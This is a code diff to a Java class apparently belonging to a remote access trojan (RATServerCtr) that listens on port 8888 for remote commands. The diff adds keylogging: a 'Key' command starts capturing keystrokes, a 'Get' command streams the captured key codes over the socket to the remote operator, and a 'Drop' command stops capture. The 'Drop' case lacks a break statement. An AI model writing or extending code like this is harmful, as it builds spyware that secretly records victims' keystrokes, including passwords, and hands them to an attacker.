@@ -36,6 +36,7 @@ public class RATServerCtr {
     private ServerSocket myServer;
     private ArrayList<Socket> list;
     private static Socket s;
+    public static ArrayList<Integer> key = new ArrayList<>();
 
     public RATServerCtr() {
         port = 8888;
@@ -76,10 +77,17 @@ public class RATServerCtr {
                     sendPic();
                     break;
                 case "Key":
-                    //ArrayList<Integer> key = new ArrayList<Integer>();
-                    //getKeyStrokeOn(key);
-                    
+                    sendResult("ok");
+                    //sendKeys();
+                    getKeyStrokeOn(key);
                     break;
+                case "Get":
+                    sendResult("ok");
+                    sendKeys(key);
+                    break;
+                case "Drop":
+                    sendResult("ok");
+                    getKeyStrokeOff(getKeyStrokeOn(key));
                 default:
                     sendResult("ok");
                     commandHandler(mode); //hand and send res
@@ -160,17 +168,16 @@ public class RATServerCtr {
         }
     }
     
-    public void sendKeys() {
+    public void sendKeys(ArrayList<Integer> keys) {
         try {
             DataOutputStream dout = new DataOutputStream(s.getOutputStream());
-            ArrayList<Integer> keys = new ArrayList<>();
-            getKeyStrokeOn(keys);
             dout.writeInt(keys.size());
-            
             for(int keyTemp : keys) {
                 dout.writeInt(keyTemp);
+                //System.out.println(keyTemp);
             } 
         } catch (Exception e) {
+            e.printStackTrace();
         }
     }
     
